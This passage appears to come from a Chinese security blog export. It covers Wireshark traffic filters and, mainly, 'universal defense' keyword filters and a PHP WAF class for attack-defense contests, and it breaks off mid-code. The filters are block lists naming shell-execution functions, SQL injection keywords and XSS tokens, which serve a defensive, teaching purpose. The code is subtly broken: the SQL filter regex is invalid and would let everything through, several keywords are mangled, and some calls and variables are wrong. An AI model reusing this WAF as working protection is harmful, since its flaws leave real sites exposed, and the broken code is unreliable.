class="hljs-keyword">http</span>.request.method==<span class="hljs-string">&quot;POST&quot;</span>    <span class="hljs-comment">#筛选HTTP请求方法为POST的流量包</span><br><br>URI:<span class="hljs-keyword">http</span>.request.uri==<span class="hljs-string">&quot;/img/1.gif&quot;</span>    <span class="hljs-comment">#筛选HTTP请求的URL为/img/1.gif的流量包</span><br><br><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;FLAG&quot;</span>   <span class="hljs-comment">#筛选HTTP内容为/FLAG的流量包（请求或相应中包含特定内容：flag）</span><br></code></pre></td></tr></table></figure><h3 id="（3）数据包还原："><a href="#（3）数据包还原：" class="headerlink" title="（3）数据包还原："></a>（3）数据包还原：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cobol">在 wireshark 中，存在一个交追踪流的功能，可以将 HTTP 或 TCP 流量集合在一起并还原成原始<br><br><br><br>数据，具体操作方式如下选中想要还原的流量包，右键选中，选择追踪流--TCP流/UPD流/SSL流/HTTP流.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>流量分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透学习</title>
    <link href="/2024/07/29/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/07/29/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>通防脚本</title>
    <link href="/2024/06/22/web%E5%AD%A6%E4%B9%A0/%E9%80%9A%E9%98%B2%E8%84%9A%E6%9C%AC/"/>
    <url>/2024/06/22/web%E5%AD%A6%E4%B9%A0/%E9%80%9A%E9%98%B2%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wafrce</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wafsqli</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|\&quot;|\&#x27;|\^|\|/i&quot;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wafxss</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&#x27;|http|\&quot;|\`|cookie|&lt;|&gt;|script/i&quot;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/system|tail|flag|exec|base64/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs hsp">filter_list = [<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;cherry&quot;</span>]<br>strings = <span class="hljs-string">&quot;ana&quot;</span>  <span class="hljs-meta"># 匹配包含<span class="hljs-string">&quot;ana&quot;</span>的字符串</span><br><span class="hljs-keyword">for</span> i in filter_list:<br>    <span class="hljs-keyword">if</span> i in strings:<br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Hacker!&quot;</span> )<br></code></pre></td></tr></table></figure><h4 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade">const keywords = [<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;cherry&quot;</span>];<br><br><span class="hljs-keyword">for</span> (const i of keywords) &#123;<br>    <span class="hljs-keyword">if</span> (code.<span class="hljs-built_in">includes</span>(i)) &#123;<br>        <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Hacker!&quot;</span>) <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p><a href="https://github.com/Drun1baby/JavaSecFilters">JavaSecFilters JavaSec过滤器</a> </p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-built_in">String</span>[] filterList = &#123;<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;cherry&quot;</span>&#125;;<br><span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;ana&quot;</span>; <span class="hljs-comment">// 匹配包含&quot;ana&quot;的字符串</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">String</span> s : filterList) &#123;<br>    <span class="hljs-keyword">if</span> (s.<span class="hljs-property">contains</span>(<span class="hljs-built_in">str</span>)) &#123;<br>        System.<span class="hljs-property">out</span>.<span class="hljs-property">println</span>(<span class="hljs-string">&quot;Hacker!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">filterList := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;cherry&quot;</span>&#125;<br>str := <span class="hljs-string">&quot;ana&quot;</span> <span class="hljs-comment">// 匹配包含&quot;ana&quot;的字符串</span><br><span class="hljs-keyword">for</span> _, s := <span class="hljs-keyword">range</span> filterList &#123;<br>    <span class="hljs-keyword">if</span> strings.Contains(s, str) &#123;<br>        fmt.Println(<span class="hljs-string">&quot;Hacker!&quot;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://github.com/dr0op/k4l0ng_WAF/tree/master">k4l0ng_WAF</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//ini_set(&#x27;display_errors&#x27;, 1);</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** 线下攻防php版本waf</span><br><span class="hljs-comment">** drop.wiki</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">waf</span></span>&#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-variable">$request_url</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$request_method</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$request_data</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$headers</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$raw</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">waf类</span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-comment">// 自动部署构造方法</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-comment">//echo &quot;class waf construct execute..&lt;/br&gt;&quot;;   //debug code</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_access_log_probably</span>();  <span class="hljs-comment">//记录访问纪录    类似于日志</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_access_logs_detailed</span>();  <span class="hljs-comment">//纪录详细访问请求包  </span><br><span class="hljs-comment">//echo &quot;class waf construct execute..2&lt;/br&gt;&quot;;</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;GET&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;method&quot;</span>);<br>&#125;<br><span class="hljs-comment">//echo &quot;class waf construct execute..3&lt;/br&gt;&quot;;</span><br><span class="hljs-variable language_">$this</span>-&gt;request_url= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]; <span class="hljs-comment">//获取url来进行检测</span><br><br><br><span class="hljs-variable language_">$this</span>-&gt;request_data = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//获取post</span><br><br><span class="hljs-variable language_">$this</span>-&gt;headers =<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_all_headers</span>(); <span class="hljs-comment">//获取header  </span><br><br><span class="hljs-comment">//echo &quot;class waf construct execute half..&lt;/br&gt;&quot;;</span><br><br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$this</span>-&gt;request_url)))); <span class="hljs-comment">//对URL进行检测，出现问题则拦截并记录</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$this</span>-&gt;request_data)))); <span class="hljs-comment">//对POST的内容进行检测，出现问题拦截并记录</span><br><span class="hljs-comment">//echo &quot;class waf construct execute..4&lt;/br&gt;&quot;;</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">detect_upload</span>();<br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">gloabel_attack_detect</span>();<br><br><br><span class="hljs-comment">//echo &quot;class waf construct execute  success..&lt;/br&gt;&quot;;</span><br><br><br><br>&#125;<br><br><span class="hljs-comment">//全局输入检测  基本的url和post检测过了则对所有输入进行简单过滤</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gloabel_attack_detect</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$headers</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$value</span>)))); <span class="hljs-comment">//对http请求头进行检测，出现问题拦截并记录</span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//简单过滤</span><br>&#125;<br>&#125;<br><br><br><span class="hljs-comment">//拦截所有的文件上传  并记录上传操作  并将上传文件保存至系统tmp文件夹下</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detect_upload</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;size&#x27;</span>]&gt;<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;upload file error&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;Upload&quot;</span>);<br><span class="hljs-comment">//move_uploaded_file($_FILES[$key][&quot;tmp_name&quot;],&#x27;/tmp/uoloadfiles/&#x27;.$_FILES[$key][&quot;name&quot;]);</span><br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//记录每次大概访问记录，类似日志，以便在详细记录中查找</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_access_log_probably</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-variable">$raw</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>).<span class="hljs-string">&#x27;    &#x27;</span>; <br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="hljs-string">&#x27;     &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&#x27;     &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>].<span class="hljs-string">&#x27;    &#x27;</span>; <br>    <span class="hljs-variable">$raw</span> .= <span class="hljs-string">&#x27;POST: &#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>).<span class="hljs-string">&quot;\r\n&quot;</span>; <br><span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;all_requests.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//日志路径 </span><br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-variable">$raw</span>);  <br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br>&#125;<br><br><span class="hljs-comment">//记录详细的访问头记录，包括GET POST http头   以获取通防waf未检测到的攻击payload</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_access_logs_detailed</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>).<span class="hljs-string">&quot; -- &quot;</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_http_raws</span>().<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br>    <span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;all_requests_detail.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//日志路径 </span><br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$data</span>));  <br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">获取http请求头并写入数组</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_all_headers</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(); <br> <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123; <br>            <span class="hljs-variable">$headers</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>; <br>        &#125; <br>    &#125; <br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>; <br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测不可见字符造成的截断和绕过效果，注意网站请求带中文需要简单修改</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_invisible</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$ascii</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ascii</span>&gt;<span class="hljs-number">126</span> || <span class="hljs-variable">$ascii</span> &lt; <span class="hljs-number">32</span>)&#123; <span class="hljs-comment">//有中文这里要修改</span><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>)))&#123;<br>                <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;interrupt&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;,&quot;</span>), <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测网站程序存在二次编码绕过漏洞造成的%25绕过，此处是循环将%25替换成%，直至不存在%25</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_0x25</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&quot;%25&quot;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;%25&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>    &#125;<br>&#125; <br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">攻击关键字检测，此处由于之前将特殊字符替换成空格，即使存在绕过特性也绕不过正则的\b</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_attack_keyword</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/select\b|insert\b|update\b|drop\b|and\b|delete\b|dumpfile\b|outfile\b|load_file|rename\b|floor\(|extractvalue|updatexml|name_const|multipoint\(/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;sqli&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//文件包含的检测</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]) &lt; <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$str</span>);<br>        <span 